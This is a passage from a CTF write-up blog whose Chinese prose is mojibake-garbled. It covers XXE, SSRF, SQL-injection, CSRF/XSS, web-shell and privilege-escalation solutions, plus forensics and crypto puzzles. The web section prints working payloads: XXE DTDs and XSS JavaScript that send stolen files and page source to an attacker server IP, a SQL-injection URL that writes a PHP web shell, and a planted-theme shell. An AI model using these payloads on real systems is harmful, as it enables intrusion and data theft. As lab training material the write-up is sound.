<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab <span class="string">&quot;HELLO&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;	</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>æäº¤SVGå›¾ç‰‡æºç åœ°å€å‘ç°å®ä½“æˆåŠŸæ˜¾ç¤º</p>
<p>ç„¶åå°è¯•è¯»å–æ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>é¡µé¢è™½ç„¶æ­£å¸¸è¿”å›ä¿¡æ¯ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ç›´æ¥è¯»åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p>
<p>æ— å›æ˜¾ï¼Œåˆæ˜¯XXEï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹XXEç›²æ‰“ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åŠ è½½å¤–éƒ¨ä¸€ä¸ªdtdæ–‡ä»¶ï¼Œç„¶åæŠŠè¯»å–ç»“æœä»¥HTTPè¯·æ±‚çš„æ–¹å¼å‘é€åˆ°è‡ªå·±çš„VPSã€‚</p>
<p>æ„é€ 1.svg</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;http://39.105.158.221:1234/1.dtd&quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ 1.dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://39.105.158.221:1234/?%file;&#x27;&gt;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ï¼Œå› ä¸ºxmlè§£æå™¨æ”¯æŒä½¿ç”¨php://filterè¿›è¡Œç¼–ç ã€‚</p>
<p>è¿™é‡Œéœ€è¦vpsä¸Šéšä¾¿åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸Šå¼€å¯httpæœåŠ¡ï¼Œç„¶åæŠŠ1.svgåˆ1.dtdä¸¢è¿›å»å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘é¡µæäº¤1.svgçš„é“¾æ¥å³å¯æˆåŠŸè¯»å–åˆ°.bash_history</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /app</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨SSRFæ‰“å†…ç½‘</p>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/app/index.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°sqlæ³¨å…¥ï¼Œå†™å…¥urlç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23</span><br></pre></td></tr></table></figure>

<p>è¯»å–æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=ls&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>è¯»å–flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h2><p>å¼€å¯ncç›‘å¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨contentå¤„è¾“å…¥ncç›‘å¬çš„é“¾æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„codeåŸæ¥çš„éªŒè¯ç ï¼Œæ¯”å¦‚ï¼šsubstr(md5(?), 0, 6) = b1a0fdï¼Œè¿™é‡Œçš„éªŒè¯ç å°±æ˜¯ï¼Ÿã€‚</p>
<p>éœ€è¦ä¸€ä¸ªè„šæœ¬æ¥çˆ†ç ´ï¼Œè¿™é‡Œè´´ä¸€ä¸‹è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®</span></span><br><span class="line"><span class="comment"># ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># è®¡ç®—MD5å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2ff56c&#x27;</span>   <span class="comment">#å·²çŸ¥çš„md5æˆªæ–­å€¼</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®</span></span><br><span class="line">md5length = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])   <span class="comment"># å¼€å§‹ä½ç½®</span></span><br><span class="line">    end = int(key[<span class="number">1</span>])    <span class="comment"># ç»“æŸä½ç½®</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="comment">#print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == keymd5:            <span class="comment"># æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># æ‰“å°</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">list=[]  <span class="comment"># å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):   <span class="comment"># å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool(<span class="number">100</span>)    <span class="comment"># å¤šçº¿ç¨‹ä»»åŠ¡</span></span><br><span class="line">pool.map(findmd5, list) <span class="comment"># å‡½æ•° ä¸å‚æ•°åˆ—è¡¨</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°Referer: <a href="http://127.0.0.1//admin_shark.php">http://127.0.0.1//admin_shark.php</a></p>
<p>è¿™æ˜¯ç®¡ç†å‘˜çš„åå°åœ°å€ï¼Œè®¿é—®æç¤ºç™»é™†åœ°ç‚¹é”™è¯¯ã€‚</p>
<p><strong>æ€è·¯</strong></p>
<ul>
<li>æ‰§è¡Œsqlè¯­å¥å¤„åˆ©ç”¨hexå¯ä»¥è¿›è¡Œxss</li>
<li>contactåŠŸèƒ½å¤„å¯ä»¥csrf</li>
<li>é‚£æˆ‘ä»¬å¯ä»¥å°†csrfçš„payloadæ”¾åœ¨vpsä¸Šï¼Œåœ¨contactå¤„æäº¤vpsä¸Špayloadçš„åœ°å€æ¥è§¦å‘xssè¯»å–åå°æºç ã€‚</li>
</ul>
<p>ç”¨äºCSRFçš„è¡¨å•</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;exp&quot;</span> action=<span class="string">&quot;http://127.0.0.1/sql.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;sql&quot;</span> value=<span class="string">&quot;select 0x3c734372497074207372433d2f2f78732e73622f56346f383e3c2f7343526970543e&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">document.exp.submit()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯æ”¾åœ¨XSSå¹³å°çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function createXmlHttp() &#123;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = new XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var MSXML = new Array(<span class="string">&#x27;MSXML2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>, <span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (var n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                xmlHttp = new ActiveXObject(MSXML[n]);</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125; catch(e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">createXmlHttp();</span><br><span class="line">xmlHttp.onreadystatechange = function()&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=escape(xmlHttp.responseText);</span><br><span class="line">        createXmlHttp();</span><br><span class="line">        url = <span class="string">&quot;http://39.105.158.221:1215/re.php&quot;</span>;   //è¿™é‡Œæ˜¯æˆ‘ä»¬æœåŠ¡å™¨æ¥å—çš„åœ°å€</span><br><span class="line">        cc = <span class="string">&quot;htmlcode=&quot;</span> + code +<span class="string">&quot;&amp;filename=index.html&quot;</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">&quot;POST&quot;</span>, url, true);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlHttp.send(cc)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlHttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/admin_shark.php&quot;</span>, true);//è¿™å—å¡«å†™è·å¾—çš„åå°åœ°å€ã€‚</span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">&quot;Referer&quot;</span>, <span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">xmlHttp.send(null);</span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶æºç EXP</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        function js_unescape($str) &#123;</span><br><span class="line">                $ret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                $len = strlen($str);</span><br><span class="line">                <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $len;$i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; $str[$i + <span class="number">1</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                                $val = hexdec(substr($str, $i + <span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                                <span class="keyword">if</span> ($val &lt; <span class="number">0x7f</span>) $ret.= chr($val);</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> ($val &lt; <span class="number">0x800</span>) $ret.= chr(<span class="number">0xc0</span> | ($val &gt;&gt; <span class="number">6</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                <span class="keyword">else</span> $ret.= chr(<span class="number">0xe0</span> | ($val &gt;&gt; <span class="number">12</span>)) . chr(<span class="number">0x80</span> | (($val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                $i+= <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                                $ret.= urldecode(substr($str, $i, <span class="number">3</span>));</span><br><span class="line">                                $i+= <span class="number">2</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> $ret.= $str[$i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $ret;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = js_unescape($_POST[<span class="string">&#x27;htmlcode&#x27;</span>]);  //å¯¹è·å¾—æºç js_unescapeè§£ç ã€‚</span><br><span class="line">        $filename = $_POST[<span class="string">&#x27;filename&#x27;</span>] . date(<span class="string">&quot;y-m-d-h-i-s&quot;</span>) . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        $myfile = fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite($myfile, $data);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨contentå¤„è®¿é—®CSRFè¡¨å•å³å¯</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="pyå—ï¼Ÿ"><a href="#pyå—ï¼Ÿ" class="headerlink" title="pyå—ï¼Ÿ"></a><strong>pyå—ï¼Ÿ</strong></h2><p>é¢˜ç›®æ˜¯ä¸€å¼ è€å¤–ç©¿ç€pythonæ–‡åŒ–è¡«çš„å›¾ç‰‡ã€‚</p>
<p>ä¿®æ”¹æ­£å¸¸é«˜åº¦æ¢å¤æ­£å¸¸çš„crc32æ ¡éªŒã€‚</p>
<p>ç„¶åStegsolve-&gt;Analyse-&gt;Data Extract</p>
<p>å‘ç°base64ï¼Œè§£ç å³å¯å¾—åˆ°flagã€‚</p>
<h2 id="å¤æ—¥è®¡åˆ’"><a href="#å¤æ—¥è®¡åˆ’" class="headerlink" title="å¤æ—¥è®¡åˆ’"></a>å¤æ—¥è®¡åˆ’</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯æ‹–è¿›010å‘ç°æ˜¯ä¸€ä¸ªRARå‹ç¼©æ–‡ä»¶ï¼Œç”¨360è§£å‹æ‰“å¼€ç›´æ¥æ‹–å‡ºæ¥å³å¯ã€‚å‘ç°secret.raræŸåï¼Œç”¨WinRARä¿®å¤ï¼Œæ‰“å¼€å‘ç°å››ä¸ªæ–‡ä»¶ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret<span class="number">-1</span></span><br><span class="line">secret<span class="number">-2</span></span><br><span class="line">secret<span class="number">-3</span></span><br><span class="line">secret<span class="number">-4</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹å®˜æ–¹wpæ˜¯ä¼ªåŠ å¯†ä¿®æ”¹è¿™é‡Œã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />

<p>ç„¶åæ–‡ä»¶4åˆ1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy /b <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span> new.txt</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨gnuplotè½¬åŒ–å›¾åƒï¼Œä¹Ÿå¯ä½¿ç”¨PIL</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">140</span>,<span class="number">140</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;new.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ±‰ä¿¡ç æ‰«ç å¯å¾—flagã€‚</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>åœ¨wiresharké‡Œé¢å¯¼å‡ºHttpå¯¹è±¡åˆ—è¡¨ï¼Œå‘ç°flag.jpgï¼Œæ”¹zipåç¼€</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />

<p>ç„¶åcrc32è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0xC</span>RC32</span><br></pre></td></tr></table></figure>

<p>è¿èµ·æ¥å³å¯å¾—åˆ°flagã€‚</p>
<h2 id="easy-analysis"><a href="#easy-analysis" class="headerlink" title="easy_analysis"></a>easy_analysis</h2><p>ä½¿ç”¨çš„æ˜¯windowsç‰ˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">volatility.exe -f memory imageinfo <span class="comment">#åˆ¤æ–­ç³»ç»Ÿï¼ŒçŒœæµ‹ä¸º win7SP1X64</span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 pslist <span class="comment">#æŸ¥çœ‹è¿›ç¨‹ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 cmdscan <span class="comment">#æŸ¥çœ‹å‘½ä»¤è¡Œè®°å½•ï¼Œå‘ç°flag æ–‡ä»¶å¤¹ã€‚ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 filescan|findstr <span class="string">&quot;flag&quot;</span> <span class="comment">#å°è¯•æŸ¥æ‰¾å¸¦ flag çš„æ–‡ä»¶å‘ç°ä¸€ä¸ª analyse.zip æ–‡ä»¶ </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000001e85f430</span> --dump-dir=outdir <span class="comment">#å¯¼å‡ºæ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 hashdump <span class="comment">#æŸ¥çœ‹å¯†ç ï¼Œä½¿ç”¨md5è§£å¯†è§£å‡ºå¯†ç AaBbCc123</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¯†ç è§£å‹usbæµé‡åŒ…</p>
<p>usbæµé‡åˆ†æï¼š<a style="text-decoration:none;" class="foo" href="http://www.ga1axy.top/index.php/archives/10/" target="_blank">ä¼ é€é—¨</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed â€˜/^\s*$/dâ€™ &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p>base64éšå†™ï¼š<a style="text-decoration:none;" class="foo" href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank">ä¼ é€é—¨</a></p>
<p>åˆ†ç¦»æ•°æ®ï¼Œbreakautokey.pyçˆ†ç ´ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç THISKEYBOARDSUCKSFORYOUï¼Œç„¶åå†base64éšå†™è§£å¼€å³å¯å¾—åˆ°flagã€‚</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><p>ä»æ–‡ä»¶æå–å‡ºä¸€æ®µå­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo=</span><br></pre></td></tr></table></figure>

<p>CyberChefç½‘ç«™</p>
<p>base64-base32-é­”æ³•æ£’å³å¯å¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF 2020</title>
    <url>/2020/06/01/GKCTF%202020/</url>
    <content><![CDATA[<p>æŠ½ç©ºå¤ç°ä¸€ä¸‹<a id="more"></a></p>
<h4 id="è€å…«å°è¶…å¸‚"><a href="#è€å…«å°è¶…å¸‚" class="headerlink" title="è€å…«å°è¶…å¸‚"></a><strong>è€å…«å°è¶…å¸‚</strong></h4><p>æ‰“å¼€ä¹‹åæ˜¯ä¸ªshopxoçš„å•†åŸï¼Œç”¨é»˜è®¤åå°è´¦å·å¯†ç ç™»å½•ï¼ŒæˆåŠŸè¿›å…¥åå°ã€‚</p>
<p>ä¸‹è½½å…è´¹çš„ä¸»é¢˜ï¼ŒæŠŠä¸€å¥è¯æœ¨é©¬æ”¾è¿›å»ã€‚</p>
<p>å®‰è£…ä¸»é¢˜ï¼Œå³å¯getshell</p>
<p>å‚è€ƒï¼š<a class="foo" href="http://www.nctry.com/1660.html" target="_blank">ä¼ é€é—¨</a></p>
<p>ç„¶ååœ¨å‡flagå‘ŠçŸ¥ä¸‹å¾—çŸ¥çœŸflagåœ¨/rootç›®å½•ä¸‹ï¼Œä½†æ˜¯å› ä¸ºå½“å‰æ˜¯www-dataç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™è®¿é—®/rootç›®å½•çš„ã€‚</p>
<p>ç„¶ååœ¨æ ¹ç›®å½•ä¸‹å‘ç°auto.sh</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220703847.png" style="high:80%;width:80%;" />

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220146582.png" style="high:80%;width:80%;" />

<p>è¾“å…¥ps -efå‘ç°auto.shæ˜¯rootæƒé™æ‰§è¡Œçš„ã€‚</p>
<p>ç„¶ååœ¨/var/mail/makeflaghint.pyä¿®æ”¹ä¸€ä¸‹ä»£ç ï¼ŒåŠ å…¥ä¸¤è¡Œå†…å®¹è¯»å–/root/flagåˆ°/flag.hint</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220613995.png" style="high:80%;width:80%;" />

<p>ç„¶ååœ¨flag.hinté‡Œé¢æˆåŠŸè¯»å–flagã€‚</p>
<h4 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a><strong>CheckIN</strong></h4><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line">&#123;</span><br><span class="line">        public $code = null;</span><br><span class="line">        public $decode = null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];</span><br><span class="line">                $this-&gt;decode = @base64_decode( $this-&gt;code );</span><br><span class="line"><span class="meta">                @Eval($this-&gt;decode);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName(); </span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p>base64åŠ å¯†ä¸º cGhwaW5mbygpOw== </p>
<p>å›æ˜¾æˆåŠŸï¼Œåˆ©ç”¨ä¸€å¥è¯è¿æ¥ </p>
<p>eval($_POST[cmd]);</p>
<p>base64åŠ å¯†å¾—ZXZhbCgkX1BPU1RbY21kXSk7</p>
<p>åœ¨æ ¹ç›®å½•çœ‹åˆ°ä¸€ä¸ªflagï¼Œä½†æ˜¯æ²¡æœ‰æƒé™æŸ¥çœ‹ï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶ã€‚</p>
<p>ä½†æ˜¯å‘ç°èšå‰‘ç»ˆç«¯å¹¶ä¸èƒ½ç”¨ï¼Œå›åˆ°phpinfo()å‘ç°å¾ˆå¤šæ–¹æ³•è¢«ç¦ç”¨ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225116128.png" style="high:80%;width:80%;" />

<p>è¿‡æ»¤äº†å¾ˆå¤šfunctionï¼Œæƒ³åˆ°ç»•è¿‡disable_functionsï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä½¿å…¶æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œexpåœ°å€ï¼š<a class="foo" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank">ä¼ é€é—¨</a></p>
